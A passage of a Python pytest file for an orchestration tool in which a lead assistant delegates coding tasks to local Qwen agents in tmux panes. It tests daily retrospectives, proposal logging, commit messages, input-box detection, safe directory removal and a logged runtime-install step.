    s = rt.calls()[0]["stdin"]
    assert "evil_name" not in s and "tests/t.py" not in s
    (rec,) = [json.loads(l) for l in s.split("## Log lines")[1].splitlines() if l.startswith("{")]
    assert rec["flags"] == ["unnamed-file", "test-skipped", "hook-path"]


def test_retro_rejects_lesson_with_repo_name(rt):
    rt.line("2026-11-09", flags=["unnamed-file:src/gadget.py"])
    rt.reply(lessons=["Widget tasks need the check named", "Never touch gadget.py", "Briefs name the check"])
    assert rt.run("--date", "2026-11-09")[0] == 0
    assert rt.kept() == ["Briefs name the check"]
    f = rt.retro_file("2026-11-09").read_text()
    assert "Widget tasks need the check named" in f and "Never touch gadget.py" in f


def test_retro_allows_slash_words(rt):
    rt.line("2026-11-09")
    rt.reply(lessons=["Report pass/fail with the check tail", "Read and/or diff before merge",
                      "Split work 1 / 2 between panes", "Look at ~/notes first", "Check /etc first", "Edit src/app.py carefully"])
    assert rt.run("--date", "2026-11-09")[0] == 0
    assert rt.kept() == ["Report pass/fail with the check tail", "Read and/or diff before merge",
                         "Split work 1 / 2 between panes"]


def test_retro_caps_lessons(rt):
    rt.line("2026-11-09")
    rt.reply(lessons=["x" * 201, "y" * 200] + [f"lesson number {i}" for i in range(25)])
    assert rt.run("--date", "2026-11-09")[0] == 0
    kept = rt.kept()
    assert len(kept) == 20 and kept[0] == "y" * 200 and kept[-1] == "lesson number 18"
    assert "x" * 201 in rt.retro_file("2026-11-09").read_text()


def test_retro_writes_findings_and_rejects(rt):
    rt.line("2026-11-09")
    rt.reply(findings="## Misroutes\n\nOne task went to Qwen with no check.", lessons=["z" * 250])
    code, out, err = rt.run("--date", "2026-11-09")
    assert code == 0, err
    f = rt.retro_file("2026-11-09").read_text()
    assert "One task went to Qwen with no check." in f
    assert "z" * 250 in f and "200" in f


def test_retro_appends_proposals(rt):
    rt.line("2026-11-09")
    lead_before = (cli.HERE / "lead.md").read_text()
    (rt.src / "OPEN-QUESTIONS.md").write_text("# Open questions\n\nUpdated 2026-11-01 10:00\n\n## Open\n\n"
                                              "**1. Old question?**\n\n## Offers\n\nnone\n")
    rt.reply(proposals=["Allow two Qwen tasks at once", "Route renames to Qwen"])
    assert rt.run("--date", "2026-11-09")[0] == 0
    q = (rt.src / "OPEN-QUESTIONS.md").read_text()
    open_part = q.split("## Open", 1)[1].split("## Offers", 1)[0]
    assert "**1. Old question?**" in open_part
    assert "Allow two Qwen tasks at once" in open_part and "Route renames to Qwen" in open_part
    assert "**2." in open_part and "**3." in open_part
    assert "## Offers\n\nnone" in q and "Updated 2026-11-01 10:00" not in q
    assert (cli.HERE / "lead.md").read_text() == lead_before  # nothing applied
    assert "Allow two Qwen tasks at once" in rt.retro_file("2026-11-09").read_text()


def test_retro_appends_proposals_new_file(rt):
    rt.line("2026-11-09")
    rt.reply(proposals=["Try the bigger model"])
    assert rt.run("--date", "2026-11-09")[0] == 0
    q = (rt.src / "OPEN-QUESTIONS.md").read_text()
    assert "## Open" in q and "**1." in q and "Try the bigger model" in q


def test_retro_lessons_replace_file(rt):
    rt.lessons.write_text("## Lessons\n\n- old lesson one\n- old lesson two\n")
    rt.git("commit", "-qam", "lessons")
    rt.line("2026-11-09")
    rt.reply(lessons=["merged lesson"])
    assert rt.run("--date", "2026-11-09")[0] == 0
    assert rt.kept() == ["merged lesson"]
    assert "old lesson one" in rt.calls()[0]["stdin"]  # the retro saw the old list


def test_retro_commits_only_lessons_on_main(rt):
    (rt.src / "OPEN-QUESTIONS.md").write_text("x\n")
    (rt.src / ".gitignore").write_text("OPEN-QUESTIONS.md\n")
    rt.git("add", ".gitignore")
    rt.git("commit", "-qm", "ignore")
    rt.line("2026-11-09")
    rt.reply(lessons=["Briefs name the check"], proposals=["p"])
    assert rt.run("--date", "2026-11-09")[0] == 0
    assert rt.git("log", "-1", "--format=%s").strip() == "mates: lessons from retro 2026-11-09"
    assert rt.git("show", "--name-only", "--format=", "HEAD").split() == ["mates/lead-lessons.md"]
    assert rt.git("status", "--porcelain") == ""
    # another branch: written, not committed
    rt.git("checkout", "-qb", "side")
    rt.line("2026-11-10")
    rt.reply(lessons=["Second lesson"])
    assert rt.run("--date", "2026-11-10")[0] == 0
    assert rt.kept() == ["Second lesson"]
    assert rt.git("log", "-1", "--format=%s").strip() == "mates: lessons from retro 2026-11-09"
    assert "not committed" in rt.retro_file("2026-11-10").read_text()
    assert "side" in rt.retro_file("2026-11-10").read_text()


def test_retro_no_commit_when_tree_dirty(rt):
    (rt.src / "mates" / "cli.py").write_text("wip\n")
    rt.line("2026-11-09")
    rt.reply(lessons=["Briefs name the check"])
    assert rt.run("--date", "2026-11-09")[0] == 0
    assert rt.kept() == ["Briefs name the check"]
    assert rt.git("log", "-1", "--format=%s").strip() == "init"
    f = rt.retro_file("2026-11-09").read_text()
    assert "not committed" in f and "mates/cli.py" in f


def test_retro_catches_up_missed_days(rt, monkeypatch):
    import datetime
    monkeypatch.setattr(rt.retro, "_today", lambda: datetime.date(2026, 11, 10))
    rd = cli.LOG.parent / "retros"
    rd.mkdir(parents=True)
    (rd / "2026-11-05.md").write_text("# Retro 2026-11-05\n\nPRIOR-RETRO-TEXT\n")
    for day in ("2026-11-04", "2026-11-05", "2026-11-06", "2026-11-08", "2026-11-09", "2026-11-10"):
        rt.line(day, summary=f"task on {day}")
    code, out, err = rt.run()
    assert code == 0, err
    calls = rt.calls()
    assert len(calls) == 3  # 06, 08, 09; 07 has no lines; 10 is today
    assert ["task on 2026-11-06" in calls[0]["stdin"], "task on 2026-11-08" in calls[1]["stdin"],
            "task on 2026-11-09" in calls[2]["stdin"]] == [True] * 3
    assert "PRIOR-RETRO-TEXT" in calls[0]["stdin"]
    assert "Retro 2026-11-06" in calls[1]["stdin"] and "PRIOR-RETRO-TEXT" in calls[1]["stdin"]  # last 7 retros
    for day in ("2026-11-06", "2026-11-08", "2026-11-09"):
        assert rt.retro_file(day).exists()
    assert not rt.retro_file("2026-11-07").exists() and not rt.retro_file("2026-11-10").exists()
    assert len(rt.git("log", "--format=%s").splitlines()) == 1  # lessons unchanged: no commits
    assert rt.run()[0] == 0 and len(rt.calls()) == 3  # caught up: nothing to do


def test_retro_bad_reply_writes_nothing(rt):
    rt.line("2026-11-09")
    (rt.t / "reply.json").write_text("not json at all")
    code, _, err = rt.run("--date", "2026-11-09")
    assert code != 0 and "retro" in err
    assert not rt.retro_file("2026-11-09").exists()


def test_retro_runs_without_lead(rt):
    assert "retro" in cli.OPEN_COMMANDS and "retro" in cli.COMMANDS


def _capture(m, text):
    (m.t / "capture").write_text(text)


def test_input_empty_box_mid_screen(m):
    """A fresh session draws the input box under the logo, mid-pane (Wai's first real run)."""
    box = ['┃  Ask anything… "Fix broken tests"',
           "┃  Build·qwen3.8-27b-turbo-heretic:mtp-iq4xsOllama (local, sandboxed)",
           "   tab agentsctrl+p commands",
           "   ● Tip Configure steps to limit agentic iterations per request"]
    lines = ["  logo"] * 24 + box + [""] * 22
    assert len(lines) == 50 and lines[24].startswith("┃  Ask anything")
    _capture(m, "\n".join(lines) + "\n")
    assert cli.input_empty("%1") is True
    _capture(m, "\n".join(lines).replace('Ask anything… "Fix broken tests"', "half a sentence Wai is typ") + "\n")
    assert cli.input_empty("%1") is False


def test_input_empty_ignores_chat_text(m):
    _capture(m, "assistant: the placeholder says Ask anything... until you type\n┃  some typed text\n")
    assert cli.input_empty("%1") is False
    _capture(m, '┃  Ask anything... "Fix a TODO in the codebase"\n')  # ASCII dots, as some terminals draw
    assert cli.input_empty("%1") is True


def test_send_accepts_fresh_pane_box_mid_screen(m):
    _capture(m, "  logo\n" * 24 + '┃  Ask anything… "Fix broken tests"\n' + "\n" * 25)
    m.send()
    assert m.buffers()[-1].startswith("[from Claude] ")


def test_commit_subject_cut_at_word_boundary():
    brief = ("Add a line to README.md saying exactly one line: `OPEN-QUESTIONS.md is gitignored` "
             "and nothing else. Then stop.")
    subj = cli.commit_subject(1, brief)
    assert len(subj) <= 72 and subj.startswith("mates qwen-1: Add a line") and subj.endswith("…")
    body = subj[len("mates qwen-1: "):-1]
    assert brief.startswith(body) and brief[len(body)] in " :,;"  # ends where a word ends
    assert cli.commit_subject(2, "Fix add(). Then run the tests.") == "mates qwen-2: Fix add()."
    assert cli.commit_subject(1, "short") == "mates qwen-1: short"


def test_merge_message_from_brief_or_m(m):
    long = "Make a.txt say b and then explain in great detail why every single word of it matters so much"
    m.send(long)
    _checked_and_diffed(m)
    assert m.run("merge", 1)[0] == 0
    subj = m.git("log", "-1", "--format=%s")
    assert subj == cli.commit_subject(1, long) and len(subj) <= 72 and subj.endswith("…")
    m.send("next")
    _checked_and_diffed(m, "c\n")
    assert m.run("merge", 1, "-m", "fix(a): a.txt says c\n\nwhy: the check wanted c")[0] == 0
    assert m.git("log", "-1", "--format=%B") == "fix(a): a.txt says c\n\nwhy: the check wanted c"
    assert m.log()[-1]["summary"] == "fix(a): a.txt says c"


def test_wait_done_only_when_idle(m):
    """Qwen writes done.md and keeps replying a while: wait holds until OpenCode stops,
    so the check right after is not refused as busy."""
    m.on_enter_creates_session("ses_1")
    m.send()
    t = m.task()["paste_ts"]
    m.msg("ses_1", "user", t + 0.1)
    m.msg("ses_1", "assistant", t + 0.2, completed_s=t + 0.3, finish="tool-calls")  # still mid-reply
    (m.wt / ".mates").mkdir(exist_ok=True)
    (m.wt / ".mates" / "done.md").write_text("a.txt: fixed\ntest status: passed\n")
    code, out, _ = m.run("wait", 1, "--timeout", "0.3")
    assert (code, out) == (1, "timeout\n")
    m.msg("ses_1", "assistant", t + 0.4, completed_s=t + 0.5, finish="stop")
    code, out, _ = m.run("wait", 1, "--timeout", "1")
    assert code == 0 and out.startswith("done: a.txt: fixed")
    assert m.run("check", 1, "--", "true")[0] == 0


def test_rmtree_never_follows_links_and_handles_mode_000(tmp_path):
    import cli
    target = tmp_path / "outside"
    target.write_text("x")
    target.chmod(0o600)
    stage = tmp_path / "stage"
    ro = stage / "ro"
    ro.mkdir(parents=True)
    (ro / "link").symlink_to(target)
    ro.chmod(0o500)
    locked = stage / "locked"
    (locked / "deep").mkdir(parents=True)
    (locked / "deep" / "f").write_text("y")
    (locked / "deep").chmod(0o000)
    locked.chmod(0o000)
    cli._rmtree(stage)
    assert not stage.exists()
    assert target.read_text() == "x"
    assert (target.stat().st_mode & 0o777) == 0o600


# --- mates runtime: the lead installs what Qwen needs (Wai, 2026-11-11: "allow the leader to
# install things", the sandboxed-install option). Builds the committed .mates/runtime.sh and
# restarts the idle Qwen panes on it, each with its OpenCode chat kept.

RT_SCRIPT = '# lockfiles: a.txt\nmkdir -p "$MATES_RUNTIME/bin"; echo "PATH=$MATES_RUNTIME/bin" > "$MATES_RUNTIME/env"\n'


def _rt_commit(m, script=RT_SCRIPT):
    (m.root / ".mates").mkdir(exist_ok=True)
    (m.root / ".mates/runtime.sh").write_text(script)
    m.git("add", "-f", ".mates/runtime.sh")  # .mates/ is in info/exclude (Qwen's protocol files)
    m.git("commit", "-q", "-m", "runtime")


def test_runtime_needs_a_committed_script(m):
    code, _, err = m.run("runtime", "--reason", "pytest for the checks")
    assert code == 2 and ".mates/runtime.sh" in err and "commit" in err


def test_runtime_needs_a_reason(m):
    _rt_commit(m)
    code, _, _ = m.run("runtime")
    assert code == 2 and m.state().get("runtime") is None


def test_runtime_builds_and_restarts_idle_panes(m):
    _rt_commit(m)
    m.ses("ses_1")
    code, out, err = m.run("runtime", "--reason", "pytest for the checks")
    assert code == 0, err
    rt = m.state()["runtime"]
    assert Path(rt).parent.parent == m.private / "mates" / "runtimes" and (Path(rt) / "env").is_file()
    calls = m.tmux_calls()
    respawn = next(c for c in calls if c.startswith("respawn-pane"))
    assert respawn.startswith(f"respawn-pane -k -t %1 -c {m.root} ")
    assert f"QWEN_RUNTIME={rt}" in respawn and "-s ses_1" in respawn  # the chat is kept
    unlive = f"set-option -p -u -t %1 {cli.QWEN_LIVE}"
    assert calls.index(unlive) < calls.index(respawn) < calls.index("wait-for -S mates-go-%1")
    assert "restarted Qwen pane 1" in out


def test_runtime_refuses_busy_pane(m):
    _rt_commit(m)
    m.ses("ses_1")
    m.msg("ses_1", "user", time.time())  # a message with no reply yet
    code, _, err = m.run("runtime", "--reason", "r")
    assert code != 0 and "busy" in err
    assert m.state().get("runtime") is None and not any(c.startswith("respawn-pane") for c in m.tmux_calls())


def test_runtime_refuses_typed_input(m):
    _rt_commit(m)
    m.input("┃  half a sentence Wai is typ\n")
    code, _, err = m.run("runtime", "--reason", "r")
    assert code != 0 and "input box" in err and m.state().get("runtime") is None


def test_runtime_unchanged_restarts_nothing(m):
    _rt_commit(m)
    assert m.run("runtime", "--reason", "r")[0] == 0
    before = len([c for c in m.tmux_calls() if c.startswith("respawn-pane")])
    code, out, _ = m.run("runtime", "--reason", "r")
    assert code == 0 and "unchanged" in out
    assert len([c for c in m.tmux_calls() if c.startswith("respawn-pane")]) == before


def test_runtime_failure_keeps_the_old_runtime(m):
    _rt_commit(m, "# lockfiles: a.txt\necho no-such-package >&2; exit 3\n")
    code, _, err = m.run("runtime", "--reason", "r")
    assert code == 1 and "no-such-package" in err
    assert m.state().get("runtime") is None and not any(c.startswith("respawn-pane") for c in m.tmux_calls())
    assert m.log()[-1]["route"] == "runtime" and m.log()[-1]["outcome"] == "failed"


def test_runtime_is_logged(m):
    _rt_commit(m)
    assert m.run("runtime", "--reason", "pytest for the checks")[0] == 0
    rec = m.log()[-1]
    assert (rec["route"], rec["outcome"], rec["reason"]) == ("runtime", "accepted", "pytest for the checks")
    assert rec["runtime"] == Path(m.state()["runtime"]).name and rec["restarted"] == [1]


def test_runtime_restarts_a_pane_left_on_an_old_runtime(m):
    _rt_commit(m)
    assert m.run("runtime", "--reason", "r")[0] == 0
    st = m.state()
    st["qwens"][0]["runtime"] = "/old/runtime"  # it was busy when the runtime last changed
    session.save(str(m.root), st)
    code, out, _ = m.run("runtime", "--reason", "r")
    assert code == 0 and "restarted Qwen pane 1" in out
    assert m.state()["qwens"][0]["runtime"] == m.state()["runtime"]
